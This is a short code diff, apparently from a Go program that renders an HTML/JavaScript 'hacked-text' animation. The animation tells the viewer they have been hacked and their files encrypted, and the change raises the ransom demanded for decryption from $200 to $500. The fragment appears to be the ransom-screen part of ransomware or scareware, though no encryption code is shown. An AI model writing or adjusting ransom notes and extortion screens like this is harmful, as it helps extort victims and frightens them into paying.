@@ -238,7 +238,7 @@ func HTML() {
 				// Trigger the "hacked-text" animation for the first two lines
 				var text1 = "You have been hacked by nobody";
 				var text2 = "and all your files have been encrypted";
-				var text3 = "To decrypt your files, you must pay $200.";
+				var text3 = "To decrypt your files, you must pay $500.";
 				var index1 = 0;
 				var index2 = 0;
 				var index3 = 0;
